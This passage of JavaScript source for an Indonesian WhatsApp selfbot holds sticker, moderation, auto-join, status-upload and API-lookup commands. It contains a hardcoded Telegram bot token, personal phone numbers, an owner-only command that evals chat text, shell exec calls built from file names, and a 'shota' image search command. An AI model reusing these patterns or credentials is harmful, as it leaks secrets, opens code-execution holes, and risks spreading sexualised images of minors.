      Cookie: hasilcookie,
      ...form.getHeaders(),
    },
    body: form.getBuffer(),
  });
  const cariurl = await geturl2.text();
  const $$ = cheerio.load(cariurl);
  const hasil = $$("source").attr("src");
  return hasil;
}

		const downloadM = async (path) => {
			path ? path : Date.now()
const buat = JSON.parse(JSON.stringify(ben).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
const dia = await benny.downloadAndSaveMediaMessage(buat, path)
return fs.readFileSync(dia)
}

if (ben.key.remoteJid == 'status@broadcast') from = 'status@broadcast'

		const sendMediaURL = async(to, url, text="", mids=[]) =>{
				if(mids.length > 0){
					text = normalizeMention(to, text, mids)
				}
				const fn = Date.now() / 10000;
				const filename = fn.toString()
				let mime = ""
				var download = function (uri, filename, callback) {
					request.head(uri, function (err, res, body) {
						mime = res.headers['content-type']
						request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
					});
				};
				download(url, filename, async function () {
					console.log('Done..');
					let media = fs.readFileSync(filename)
					let type = mime.split("/")[0]+"Message"
					if(mime === "image/gif"){
						type = MessageType.video
						mime = Mimetype.gif
					}
					if(mime.split("/")[0] === "audio"){
						mime = Mimetype.mp4Audio
					}
					benny.sendMessage(to, media, type, { quoted: adadeh, mimetype: mime, caption: text })
					
					fs.unlinkSync(filename)
				});
			}
			if (banChats == false) fake = namabot
			if (banChats == true) fake = 'SELFBOT'
			
		const reply = (teks) => {
			benny.sendMessage(from, {title: 'p', text: teks, jpegThumbnail: setthumb}, extendedText, {quoted: adadeh})
		}
		const sendMess = (hehe, teks) => {
			benny.sendMessage(hehe, teks, text, { quoted: adadeh})
		}
		const acak = (teks) => {
			teks[Math.floor(Math.random() * teks.length)]
		}
		const sendPesan = (hehe, teks) => {
			benny.sendMessage(hehe, teks, text, { "contextInfo": {mentionedJid: [sender], "forwardingScore": 999,"isForwarded": true}, quoted: adadeh})
		}
		const mentions = (teks, memberr, id) => {
			(id == null || id == undefined || id == false) ? benny.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : benny.sendMessage(from, teks.trim(), extendedText, { quoted: adadeh, contextInfo: { "mentionedJid": memberr } })
		}
		const sendPtt = (teks) => {
			  benny.sendMessage(from, audio, mp3, {quoted: adadeh, ptt: true})
        }
		
		const telestick = async (to, url) => {
let packName = url.replace("https://t.me/addstickers/", "");
 
let gas = await fetch(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=${encodeURIComponent(packName)}`, { method: "GET", headers: { "User-Agent": "GoogleBot" } } );
 
let json = await gas.json();
 
console.log(json)
for(let i of json.result.stickers) {
let fileId = i.thumb.file_id;
 
let gasIn = await fetch(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=${fileId}`)
 
let jisin = await gasIn.json();
console.log(jisin)
 buffer = await getBaper("https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" + jisin.result.file_path)
benny.sendMessage(to, buffer, sticker);
}
}

		const msgs = (message) => {
            if (body.startsWith(prefix))  {
                if (message.length >= 10){
                    return `${message.substr(0, 15)}`
                }else{
                    return `${message}`
                }
            }
        }
		
		const msgss = (message) => {
                if (message.length >= 10){
                    return `${message.substr(0, 15)}`
                }else{
                    return `${message}`
                }
        }
		
		const getUserLimit = (userId) => {
            let position = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === userId) {
                    position = i
                }
            })
            if (position !== false) {
                return _registered[position].limitCount
            }
        }
		
		const sendSticker = async(to, file) => {
			ran = getRandom('.webp')
							require('./lib/exif.js').createExif(namabot, '')
							exec(`ffmpeg -i ${file} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${ran}`, (err) => {
								if (err) return reply('error')
							exec(`webpmux -set exif ./src/sticker/data.exif ${ran} -o ${ran}`, async (error) => {
                          benny.sendMessage(to, fs.readFileSync(ran), sticker, {quoted: adadeh})
							})
							})							
						}

		const sendStickerUrl = async(to, url) => {
			console.log(color(tampilTanggal, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading sticker...'))
				var names = getRandom('.webp')
				var namea = getRandom('.png')
				var download = function (uri, filename, callback) {
					request.head(uri, function (err, res, body) {
						request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
					});
				};
				download(url, namea, async function () {
					let filess = namea
					let asw = names
					require('./lib/exif.js').createExif(namabot, '')
					exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
					exec(`webpmux -set exif ./src/sticker/data.exif ${asw} -o ${asw}`, async (error) => {
					let media = fs.readFileSync(asw)
					benny.sendMessage(to, media, sticker, {quoted: adadeh})
					console.log(color(tampilTanggal, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Succes send sticker...'))
					});
					});
				});
			}

offline = process.uptime()
waktuoff = `${tek(offline)}`
		
		const isQuotedImages = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedStickers = type === 'extendedTextMessage' && content.includes('stickerMessage')
		
		if (isGroup && isAutoSticker) {
			if (isMedia && !ben.message.videoMessage || isQuotedImages) {
							const encmedia = isQuotedImages ? JSON.parse(JSON.stringify(ben).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : ben
							const media = await benny.downloadAndSaveMediaMessage(encmedia)
							sendSticker(from, media)
			}
		}
		
    if (!isGroup && isAutoStick) {
			if (isMedia && !ben.message.videoMessage || isQuotedImages) {
							const encmedia = isQuotedImages ? JSON.parse(JSON.stringify(ben).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : ben
							const media = await benny.downloadAndSaveMediaMessage(encmedia)
							sendSticker(from, media)
			}
		}

		colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
		const isQuotedText = type === 'extendedTextMessage'
		const isQuotedLink = type === 'extendedTextMessage' && content.includes('extendedTextMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
	
	    //Ignore ban user
		    if (isBanned && !isGroup && !isCmd) console.log(color(time, "gold"), color("[ BAN ]", "red"), color(msgss(budy)), color("from", "pink"), color(sender.split('@')[0], "yellow"))
            if (isBanned && isGroup && !isCmd) console.log(color(time, "gold"), color("[ BAN ]", "red"), color(msgss(budy)), color("from", "pink"), color(sender.split('@')[0], "yellow"), color("in", "purple"), color(groupName, "yellow"))
            if (isBanned && !isGroup && isCmd) console.log(color(time, "gold"), color("[ BAN ]", "red"), color(msgs(command)), color("from", "pink"), color(sender.split('@')[0], "blue"))
			
	    //Message
		if (!isStatus && !isGroup && command) console.log(color(tampilTanggal, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color("[ COMMAND ]", "aqua"), color(msgs(command)), color("from", "pink"), color('+' + sender.split('@')[0], "lime"))
		    if (!isStatus && !isGroup && !command) console.log(color(tampilTanggal, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color("[ PRIVATE ]", "aqua"), color(msgss(budy)), color("from", "pink"), color('+' + sender.split('@')[0], "lime"))
	        if (!isStatus && isGroup && command) console.log(color(tampilTanggal, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color("[ COMMAND ]", "aqua"), color(msgs(command)), color("from", "pink"), color('+' + sender.split('@')[0], "lime"), color("in", "purple"), color(groupName, "yellow"))
	        if (!isStatus && isGroup && !command) console.log(color(tampilTanggal, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color("[ GROUP ]", "aqua"), color(msgss(budy)), color("from", "pink"), color('+' + sender.split('@')[0], "lime"), color("in", "purple"), color(groupName, "yellow"))
	        if (isStatus) console.log(color(tampilTanggal, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color("[ STATUS ]", "aqua"), color(msgss(budy)), color("from", "pink"), color('+' + sender.split('@')[0], "lime"))
          
		 //Anti spam
		  if (isCmd && isFiltered(from) && !isGroup && !isOwner && !ben.key.fromMe) return console.log(color(tampilTanggal, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color("[ SPAM ]", "red"), color(msgs(command)), color("from", "pink"), color('+' + sender.split('@')[0], "lime"))
		   if (isCmd && isFiltered(from) && isGroup && !isOwner && !ben.key.fromMe) return console.log(color(tampilTanggal, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color("[ SPAM ]", "red"), color(msgs(command)), color("from", "pink"), color('+' + sender.split('@')[0], "lime"), color("in", "purple"), color(groupName, "yellow"))
	        if (isCmd && !isOwner && !ben.key.fromMe) addFilter(from)
			
			if (!ben.key.fromMe) {
		if (ben.message.extendedTextMessage != null || ben.message.extendedTextMessage != undefined) {
	if (ben.message.extendedTextMessage.contextInfo != null || ben.message.extendedTextMessage.contextInfo != undefined) {
	if (ben.message.extendedTextMessage.contextInfo.quotedMessage.orderMessage) {
		benny.modifyChat(from, 'clear')
	}
	}
		}
			}
	
	if (!ben.key.fromMe && isGroup && isAntilink) {
	if (budy.includes("://chat.whatsapp.com/")) {
		if (isGroupAdmins) return reply('Kamu admin grup jadi ngga di kick :)')
		console.log(color('[KICK]', 'red'), color('Received a link!', 'yellow'))
		reply(`「 *PETUGAS PEMBERSIH* 」\n\nKamu nakal si! Ngapain kirim link grup lain? \nMaaf tapi aku harus mengeluarkan kamu...\nSelamat tingal~`)
				 benny.groupRemove(from, [sender])
}
	}
	
	if (!ben.key.fromMe && !isGroup && banChat == true) {
			reply(`*Mohon Maaf Benny Sedang Offline!*\n\n• *Alasan:* ${alasanoff}\n• *Sejak:* ${waktuoff}\n\nSilahkan hubungi lagi setelah *10 menit*`)
					}
					
	if (!ben.key.fromMe && isCmd && isGroup && banChat == true) {
			reply(`*Mohon Maaf Benny Sedang Offline!*\n\n• *Alasan:* ${alasanoff}\n• *Sejak:* ${waktuoff}\n\nSilahkan hubungi lagi setelah *10 menit*`)
					}
					
	if (!ben.key.fromMe && !isGroup && autoblock == true) {
			if (sender != '62') {
			benny.blockUser(sender, "add")
			}
					}
					
	if (autoread) {
		benny.chatRead(from)
	}
	
	if (!ben.key.fromMe && autojoin) {
	if (budy.includes("://chat.whatsapp.com/")) {
		console.log(color('[AUTO JOIN]', 'cyan'), color('BRING ME THE HORIZON 2011', 'yellow'))
				 benny.query({
json:["action", "invite", `${budy.replace('https://chat.whatsapp.com/','')}`]
})
}
	}
	
	
	if (!ben.key.fromMe && banChat == true) {
			if (budy.includes(`@${buattag}`)) {
			reply(`*Mohon Maaf Benny Sedang Offline!*\n\n• *Alasan:* ${alasanoff}\n• *Sejak:* ${waktuoff}\n\nSilahkan hubungi lagi setelah *10 menit*`)
			}
			}
		
			
const tebakgambar = (jawaban) => {
	if (tebakgamb == false) return
	if (budy.toLowerCase() == jawaban) {
	reply('*Selamat jawaban kamu benar!*')
	tebakgamb = false
	}
}
	
	if (budy) {
	for (var i = 0; i < commandsDB.length ; i++) {
				if (budy.toLowerCase() === commandsDB[i].pesan) {
					reply(commandsDB[i].balasan)
				}
			}
	}
	if (!ben.key.fromMe && isGroup && isVirus && budy) {
	for (var i = 0; i < badwordDB.length ; i++) {
				if (budy.includes(badwordDB[i].badword)) {
					if (isGroupAdmins) return reply('Kamu admin grup jadi ngga di kick :)')
				 reply(`「 *PETUGAS PEMBERSIH* 」\n\nKamu nakal si! Ngapain ngomong kotor? \nMaaf tapi aku harus mengeluarkan kamu...\nSelamat tingal~`)
				 console.log(color('[KICK]', 'red'), color('Received a badword!', 'yellow'))
					benny.groupRemove(from, [sender])
				}
			}
	}
			
	if (budy.includes(`@${buattag}`)) {
		if (antitag == false) return
		if (!isGroup) console.log(color(tampilTanggal, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color("[ TAG ]", "aqua"), color('Received a tag'), color("from", "pink"), color(sender.split('@')[0], "blue"))
	        if (isGroup) console.log(color(tampilTanggal, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color("[ TAG ]", "aqua"), color('Received a tag'), color("from", "pink"), color(sender.split('@')[0], "blue"), color("in", "purple"), color(groupName, "yellow"))
		benny.chatRead(from)
	}
	
			
		//Anti virus function
		if (isGroup && !ben.key.fromMe && isKasar && isBotGroupAdmins) {
		    if (budy.length >= 1500) {
				if (isGroupAdmins) return reply('Kamu admin grup jadi ngga di kick :)')
				reply(`「 *PETUGAS PEMBERSIH* 」\n\nKamu nakal si! Ngapain kirim virus? \nMaaf tapi aku harus mengeluarkan kamu...\nSelamat tingal~`)
				 console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
				 benny.groupRemove(from, [sender])
				}
		}
		
		if (!ben.key.fromMe) {
		    if (budy.length >= 3000) {
				 console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
				 benny.clearMessage(ben.key)
				}
			}
			
			if (ben.message.stickerMessage) {
				if (autoget == true) {
					benny.starMessage(ben.key)
				} 
			}
			
			if (isGroup && isCmd && !isGroupAdmins && !isOwner && !ben.key.fromMe && isSimi) return reply(`*Kalau mau pakai bot minta tolong admin untuk mematikan modesimi*\n*Contoh:* ${prefix}modesimi off`)
			if (isCmd) {
		  hit.addHit(sender, _hit)
			}
			
			if (isGroup && isSimi && !ben.key.fromMe) {
				anu = await fetchJson(`https://api.lolhuman.xyz/api/simi?apikey=${lolkey}&text=${budy}`)
				reply(anu.result)
			}
			
			
			//Public&Self Function
		    if (!isOwner && !ben.key.fromMe && banChats === true) return 
			
		
	        // Automate
             premium.expiredCheck(_premium)
			 cron.schedule('0 0 * * *', () => {
            const reset = []
            _limit = reset
            console.log('Resetting user limit...')
            fs.writeFileSync('./src/limit.json', JSON.stringify(_limit))
            console.log('Success!')
        }, {
            scheduled: true,
            timezone: 'Asia/Jakarta'
        })
		 
		 
		//On off function
		if (isGroup && isBot) {
			if (!isGroupAdmins && !ben.key.fromMe) return 
		}
		    //Ban function
			if (isCmd && isBanned && !isOwner && !ben.key.fromMe) return
			//AFK By Benny
			if (isGroup && isAfk) {
				ono = JSON.parse(fs.readFileSync('./src/afk.json'))
		if (budy.includes(`@${ono.id.replace('@s.whatsapp.net', '')}`)) {
			mentioned = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
				teks = `*Sssttt jangan diganggu!* @${mentioned.split('@')[0]} *Sedang AFK!*\n\n*Sejak:* ${waktuafk}\n*Alasan:* ${reason}`
				benny.sendMessage(from, teks, text, {contextInfo: {mentionedJid: [mentioned]}})
			}
			}
			// AFK by Slavyan
            if (isGroup) {
            if (afk.checkAfkUser(sender, _afk) && !isCmd) {
                _afk.splice(afk.getAfkPosition(sender, _afk), 1)
                fs.writeFileSync('./src/afk.json', JSON.stringify(_afk))
						   benny.sendMessage(from, `*@${sender.split('@')[0]}* telah kembali dari AFK! Selamat datang kembali~`, text, {contextInfo: {mentionedJid: [sender]}})
            }
        }
			
			//On off function
		   
		   if (isCmd) {
		  botHit.push(sender)
		  fs.writeFileSync('./src/botHit.json', JSON.stringify(botHit))
		   }
		   
		   if (isCmd && !ben.key.fromMe && !isRegistered) {
			   umur = Math.floor(Math.random() * 30)
				serial = crypto.randomBytes(10).toString('hex').slice(0, 10)
				console.log(color('[REGISTER]'), color(time, 'yellow'), 'Name:', color(pushname, 'cyan'), 'Age:', color(umur, 'cyan'), 'Serial:', color(serial, 'cyan'))
			   register.addRegisteredUser(sender, pushname, umur, time, serial, _registered)
			   benny.sendMessage(botNumber, `@${sender.split('@')[0]}`, text, {contextInfo:{mentionedJid: [sender]}})
			   benny.sendMessage(botNumber, serial, text)
		   }
		   
			switch(command) {
			case 'wa.me':
				  case 'wame':
  benny.updatePresence(from, Presence.composing) 
      const palal = {
          text: `「 SELF WHATSAPP 」\n\n_Request by_ : @${sender.split("@s.whatsapp.net")[0]}\n\nYour link WhatsApp : *https://wa.me/${sender.split("@s.whatsapp.net")[0]}*\n*Or ( / )*\n*https://api.whatsapp.com/send?phone=${sender.split("@")[0]}*`,
          contextInfo: { mentionedJid: [sender] }
    }
    benny.sendMessage(from, palal, text,{ caption: text, contextInfo: { participant: groupId, quotedMessage: { conversation: '*_WA ME_*' } } }) 
				break
			case 'tampar':
					sendStickerUrl(from, 'https://media.giphy.com/media/S8507sBJm1598XnsgD/source.gif')
					break
		case 'dadu':
			        random = Math.floor(Math.random() * 6)
					sendStickerUrl(from, `https://www.random.org/dice/dice${random}.png`)
					break

		case 'return':
		if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
			try {
						let evaled = await eval(body.slice(8))
						if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
						reply(evaled)
					} catch (err) {
						reply(err)
					}
				break
			case 'rules':
			
			reply(`-----[ RULES ]-----

1. Jangan spam bot. 
Sanksi: *WARN/SOFT BLOCK*

2. Jangan telepon bot.
Sanksi: *SOFT BLOCK*

3. Jangan spam virus bot.
Sanksi: *PERMANENT BLOCK*

Jika sudah dipahami rules-nya, silakan ketik *${prefix}menu* untuk memulai!
    `)
	break
				case 'donasi':
				case 'donate':
					var itsme = `${numbernye}@s.whatsapp.net`
					var split = `*_TERIMAKASIH SUDAH MAU DONASI_*`
					var donat = `┏━━━━━━━━━━━━━━━━━━━━
┃          𝗗𝗢𝗡𝗔𝗦𝗜  
┣━━━━━━━━━━━━━━━━━━━━
┣━⊱ 𝗗𝗢𝗡𝗔𝗦𝗜 𝗕𝗢𝗦𝗤𝗨𝗘 ❉⊰━━✿
┃  
┣➥ *OVO* : -
┣➥ *PULSA* : 0813-8728-9617
┣➥ *GOPAY* : 089636006352
┃
┣━━━━━━━━━━━━━━━━━━━━
┃ _*POWERED BY BENNY*_
┗━━━━━━━━━━━━━━━━━━━━`
                    reply(donat)
					break
				case 'hidetag':
				if (ben.key.fromMe) return
					members_id = []
					teks = (args.length > 1) ? body.slice(9).trim() : `${body.slice(8)}`
					for (let mem of groupMembers){
					members_id.push(mem.jid)
					}
					mentions(teks, members_id, true) 
					break
					case 'kickbot':
					for (let mem of groupMembers){
					console.log(mem)
					woilo = mem.jid
					namalo = mem.notify
					namadia = await benny.contacts[woilo] != undefined ? benny.contacts[woilo].vname || benny.contacts[woilo].notify : undefined
					otwkick = woilo[namalo]
					console.log(namadia)
						reply('Terdeteksi ada bot disini segera di kick!')
				benny.groupRemove(from, [otwkick])
					}
					break
				case 'shota':
				
					{
						var items = ['shota anime', 'anime shota'];
						var nime = items[Math.floor(Math.random() * items.length)];
						var url = "https://api.fdci.se/rep.php?gambar=" + nime;
					
						axios.get(url)
						  .then((result) => {
							var n = JSON.parse(JSON.stringify(result.data));
							var nimek = n[Math.floor(Math.random() * n.length)];
							imageToBase64(nimek)
							.then(
								(response) => {
						var buf = Buffer.from(response, 'base64');
						benny.sendMessage(from, buf, MessageType.image, { caption: `*SHOTA!*`, quoted: adadeh })
								}
							)
							.catch(
								(error) => {
									console.log(error);
								}
							)
						
						});
						}
					break
				case 'hidetag2':
				
					var value = text.replace(text.split(' ')[0], `${body.slice(9)}`)
					var group = await benny.groupMetadata(from)
					var member = group['participants']
					var ids = []
					member.map( async adm => {
					ids.push(adm.id.replace('c.us', 's.whatsapp.net'))
					})
					var optionsss = {
					text: value,
					contextInfo: { mentionedJid: ids },
					quoted: adadeh
					}
					benny.sendMessage(from, optionsss, MessageType.text)
					break
				case 'brainly':
				
					var teks = body.slice(9)
					anu = await brainly(teks)
					teks = `*BRAINLY*\n\n`
					for (let o of anu.data) {
					for (let i of o.jawaban) {
						teks += `Pertanyaan: ${o.pertanyaan}\nJawaban: ${i.text}\n==============================\n`
					}
					}
					console.log(anu)
					reply(teks.trim())
				break
				case 'group':
				case 'grup':
				
					if (!isGroup) return reply(mess.only.group)
					if (args[0] === 'open') {
					reply(`「 *SUCCES OPEN GRUP* 」`)
					benny.groupSettingChange(from, GroupSettingChange.messageSend, false)
					} else if (args[0] === 'close') {
					await benny.groupSettingChange(from, GroupSettingChange.messageSend, true)
					reply(`「 *SUCCES CLOSE GRUP* 」`)
					}
					break
				case 'infogempa':
				
				anu = await getGempa()
				teks = `*${anu.waktu}*\n📍 *Lokasi* : *${anu.lokasi}*\n〽️ *Kedalaman* : *${anu.kedalaman}*\n💢 *Magnitudo* : *${anu.magnitudo}*\n🔘 *Potensi* : *${anu.tsunami}*\n📍 *Koordinat* : *${anu.koordinat}*`
				buffer = await getBaper(anu.gambar)
				benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: teks})
				break
				case 'cuaca':
				
				if (args.length < 1) return reply('Masukan nama kota!')
				tekss = body.slice(7)
				   anu = await fetchJson(`http://api.lolhuman.xyz/api/cuaca/${tekss}?apikey=${lolkey}`)
				   teks = `*╔❏* *CUACA*\n*╠❏*\n*╠❏* *Kota:* ${anu.result.tempat}\n*╠❏* *Cuaca:* ${anu.result.cuaca}\n*╠❏* *Suhu:* @${anu.result.suhu}\n*╠❏* *Kelembapan:* ${anu.result.kelembapan}\n*╠❏* *Angin:* ${anu.result.angin}\n*╠❏* *Latitude:* ${anu.result.latitude}\n*╚❏* *Longitude:* ${anu.result.longitude}`
                   reply(teks)
		break
		case 'covid':
				
				   anu = await fetchJson(`https://coronavirus-19-api.herokuapp.com/countries/${body.slice(7)}`)
				   p = anu
				   teks = `*╔❏* *INFO COVID ${body.slice(7)}*\n*╠❏*\n*╠❏* *Positif:* ${p.cases}\n*╠❏* *Sembuh:* ${p.recovered}\n*╠❏* *Meninggoy:* ${p.deaths}\n*╚❏* *Dirawat:* ${p.testsPerOneMillion}`
                   reply(teks)
		break
		case 'covidindo':
				
				   anu = await fetchJson(`http://api.lolhuman.xyz/api/corona/indonesia?apikey=${lolkey}`)
				   p = anu.result
				   teks = `*╔❏* *INFO COVID*\n*╠❏*\n*╠❏* *Positif:* ${p.positif}\n*╠❏* *Sembuh:* ${p.sembuh}\n*╠❏* *Meninggoy:* ${p.meninggal}\n*╚❏* *Dirawat:* ${p.dirawat}`
                   reply(teks)
		break
		case 'upswteks':
		if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
					benny.updatePresence(from, Presence.composing)
					benny.sendMessage('status@broadcast', {text: body.slice(10), jpegThumbnail: setthumb}, extendedText)
					reply(`Sukses Up story wea teks ${q}`)
					break
				case 'upswimage':
				if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
					benny.updatePresence(from, Presence.composing)
					if (isQuotedImage) {
						const swsw = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : ben
						cihcih = await benny.downloadMediaMessage(swsw)
						benny.sendMessage('status@broadcast', cihcih, image, { caption: `${body.slice(11)}` })
					}
					bur = `Sukses Upload Story Image dengan Caption: ${q}`
					benny.sendMessage(from, bur, text, {quoted: adadeh})
					break
				case 'upswstick':
				if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
					benny.updatePresence(from, Presence.composing)
					if (isQuotedSticker) {
						const swsw = JSON.parse(JSON.stringify(ben).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
						cihcih = await benny.downloadMediaMessage(swsw)
						benny.sendMessage('status@broadcast', cihcih, sticker)
					}
					bur = `Sukses Upload Story Image dengan Caption: ${q}`
					benny.sendMessage(from, bur, text, {quoted: adadeh})
					break
				case 'upswvideo':
				if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
					benny.updatePresence(from, Presence.composing)
					if (isQuotedVideo) {
						const swsw = isQuotedVideo ? JSON.parse(JSON.stringify(ben).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : ben
						cihcih = await benny.downloadMediaMessage(swsw)
						benny.sendMessage('status@broadcast', cihcih, video, { caption: `${body.slice(11)}` })
					}
					bur = `Sukses Upload Story Video dengan Caption: ${body.slice(11)}`
					benny.sendMessage(from, bur, text, {quoted: adadeh})
					break  						
		case 'buffer':
				
				if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
			      if (args.length < 1) return reply('Mau buffer apa jir')
				teks = body.slice(8)
				anu = await getBaper(teks)
				bofor = audio
				poli = {quoted: adadeh, mimetype: 'audio/mp4'}
                if (teks.includes('mp3')) bofor = audio
                if (teks.includes('mp4')) bofor = video
                if (teks.includes('png')) bofor = image
                if (teks.includes('jpg')) bofor = image
				if (bofor == image) poli = adadeh
				if (bofor == audio) poli = {quoted: adadeh, mimetype: 'audio/mp4'}
				if (bofor == video) poli = {quoted: adadeh, mimetype: 'video/mp4'}
				benny.sendMessage(from, anu, bofor, poli)
				break
				case 'listapi':
				
				if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
			      teks = `https://pecundang.herokuapp.com/api/fbdown/?url=MASUKIN_URL\n\nhttps://pecundang.herokuapp.com/api/tiktod/?url=MASUKIN_URL\n\nhttps://pecundang.herokuapp.com/api/ytsearch?q=Banyu%20surgo\n\nhttps://pecundang.herokuapp.com/api/ytmp3?url=https://www.youtube.com/watch?v=yEQ9z58UnJM\n\nhttps://pecundang.herokuapp.com/api/ytmp4?url=https://www.youtube.com/watch?v=yEQ9z58UnJM\n\nhttps://pecundang.herokuapp.com/api/playmp3?q=Banyu%20surgo\n\nhttps://pecundang.herokuapp.com/api/playmp4?q=Banyu%20surgo\n\n`
				  reply(teks)
				  break
				case 'get':
				
				if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
			      if (args.length < 1) return reply('Mau get apa jir')
				  teks = body.slice(5)
				  anu = await fetchJson(teks)
				  reply(JSON.stringify(anu))
				  break
				case 'fetch':
				
				if (!isOwner && !ben.key.fromMe) return benny.sendMessage(from, `*Maaf @${sender.split('@')[0]} Perintah ${prefix}${command} tidak ada di list ${prefix}menu!*`, text, { contextInfo: {mentionedJid: [sender]}, quoted: adadeh})
			      if (args.length < 1) return reply('Mau get apa jir')
  let res = await fetch(body.slice(7))
  if (!/text|json/.test(res.headers.get('content-type'))) return benny.sendMessage(from, body.slice(7), text, {quoted: adadeh})
  let txtf = await res.buffer()
  try {
    txtf = util.format(JSON.parse(txtf+''))
  } catch (e) {
    txtf = txtf + ''
  } finally {
    reply(txtf.slice(0, 65536) + '')
  }
				break
		case 'cuaca2':
				
				   anu = await fetchJson(`https://mnazria.herokuapp.com/api/bmkg-cuaca`)
				   teks = `*╔❏* *${anu.result.title}*\n*╠❏*\n`
				   for (let o of anu.result.desc) {
					   teks += `*╠❏* *Info:* ${o.info}\n======================\n`
				   }
				   reply(teks.trim())
		break
		case 'quotesislami':
		case 'quotesislam':
				
		anu = await fetchJson(`https://pecundang.herokuapp.com/api/randomquote/muslim?apikey=adadeh`)
		reply(anu.result.text_id)
		break
		case 'quotesimage':
				case 'qoutesimage':
				
				   anu = await getBaper(`http://api.lolhuman.xyz/api/random/quotesimage?apikey=${lolkey}`)
				   reply(mess.wait)
				   benny.sendMessage(from, anu, image, {contextInfo: {mentionedJid: [sender]}, quoted: adadeh, caption: 'Neh..'})
		break
		case 'darkjokes':
		case 'darkjoke':
				
				   reply(mess.wait)
					anu = await fetchJson(`https://naufalhoster.xyz/tools/darkjokes?apikey=${naufalkey}`)
					buffer = await getBaper(anu.result.joke)
					benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: 'Dark Jokes'})
		break
		case 'estetik':
		case 'aestetik':
				
				   reply(mess.wait)
					anu = await fetchJson(`https://api.zeks.xyz/api/estetikpic?apikey=YunitaGanteng`)
					buffer = await getBaper(anu.result.result)
					benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: 'Estetik'})
		break
		case 'puisiimage':
				
				   reply(mess.wait)
					buffer = await getBaper(`https://api.vhtear.com/puisi_image&apikey=YunitaGanteng`)
					benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: 'Estetik'})
		break
				  case 'pantun':
				
				   anu = await fetchJson(`https://pencarikode.xyz/api/pantun?apikey=pais`)
				   teks = `- *Pantun* : ${anu.pantun}`
				   reply(teks)
		break
				  case 'fakta':
				
				   anu = await fetchJson(`https://videfikri.com/api/fakta/`)
